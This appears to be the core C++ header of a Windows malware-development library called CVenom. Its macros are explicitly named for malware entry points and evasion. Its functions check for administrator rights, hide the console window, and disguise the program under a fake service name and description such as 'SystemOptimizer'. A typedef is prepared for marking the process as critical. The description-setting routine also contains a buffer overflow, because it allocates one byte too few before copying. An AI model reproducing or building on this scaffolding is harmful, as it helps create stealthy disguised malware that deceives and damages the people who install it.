// Some Macros.

#define SUCCEED		0
#define PROBLEM 	1
#define ADMIN		0
#define USER		1
#define OK		0
#define DONE		0
#define FAILED  	1
#define FILE_EXIST	1
#define FILE_NOT_FOUND  0
#define ON  		1
#define OFF 		0
#define ERROR           1
#define ERROR_SUCCESS	0

#define FUNCTION_EVADE int x

#define MALWARE_ENTRY int argc, char** argv
#define MALWARE_INIT  argc, argv

#define MALWARE_EXIT 0x00

#define KEEP_PID	0
#define CHANGE_PID	0x99

#define PAMAX	4096

#define	LINUX	0x05
#define WINDOWS	0x06

#define THREAD_ENTRY DWORD WINAPI
#define THREAD       LPVOID thrd
#define HIGH_PRIVILEGES     ADMIN
#define LOW_PRIVILEGES      USER
//#define _CRT_SECURE_NO_WARNINGS
//#define _CRT_NONSTDC_NO_DEPRECATE
//#define WIN32_LEAN_AND_MEAN

// Headers To Include
#include <iostream>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <fstream>
#include <thread>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <psapi.h>
#include <signal.h>
#include <shellapi.h>
#include <windows.h>
#include <winioctl.h>
#include <winnt.h>
#include <winerror.h>
// Accessing Some Functions From Different Namespaces.
using		std::string;
using       	std::remove;

// Custom Data Types And Typedefs

//typedef void (*function)(int);
typedef __p_sig_fn_t function;
typedef long (WINAPI* RtlSetProcessIsCritical)(
			IN  BOOLEAN	bNew,
			OUT BOOLEAN*	pbOld,
			IN  BOOLEAN	bNeedScb);
typedef struct membuf{
        char*  data;
        size_t size;
	int location=0;
}MemoryBuffer;

struct c_malware_stat__t{
	char	name[PAMAX + 1];
	char	fakename[156];
	char*	fakedescription = NULL;

	int	privileges;

	size_t  size;
};

// Global Data For Some CVenom's Functionalities.
char**				_argv__;
int				_argc__;

struct c_malware_stat__t 	Current;
struct c_malware_stat__t*	MALWARE;



int RPCheck(){
	BOOL b;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;
	b = AllocateAndInitializeSid(
	    &NtAuthority,
	    2,
	    SECURITY_BUILTIN_DOMAIN_RID,
	    DOMAIN_ALIAS_RID_ADMINS,
	    0, 0, 0, 0, 0, 0,
	    &AdministratorsGroup);
	if(b)
	{
	    if (!CheckTokenMembership( NULL, AdministratorsGroup, &b)) 
	    {
	         b = FALSE;
	    }
	    FreeSid(AdministratorsGroup);
	}

	return !b;
}

// Some Functions For Initializing The Library.
void cvinit(int argc, char** argv){
//	HANDLE fh;

	_argv__=argv;
	_argc__=argc;
	MALWARE=&Current;

//	Current.size=GetFileSize(fh, NULL);

	strncpy(Current.name, argv[0], PAMAX);
	strncpy(Current.fakename, "SystemOptimizer", 155);
	Current.privileges=RPCheck();

//	CloseHandle(fh);

	return;
}


void SetMalwareMode(int mode){
	if (mode == ON){
		HWND   wh;

		AllocConsole();
		wh=FindWindow("ConsoleWindowClass", NULL);
		ShowWindow(wh, 0x00);
	}
}

void SetMalwareFakeService(const char* name){
	strncpy(Current.fakename, name, 155);
}
void SetMalwareFakeDescription(const char* desc){
	if (Current.fakedescription){
		free(Current.fakedescription);
	}

	Current.fakedescription=(char*)malloc(strlen(desc));
	strcpy(Current.fakedescription, desc);
}

void cvexit(int x){
	if (Current.fakedescription)
		free(Current.fakedescription);
	exit(x);
}
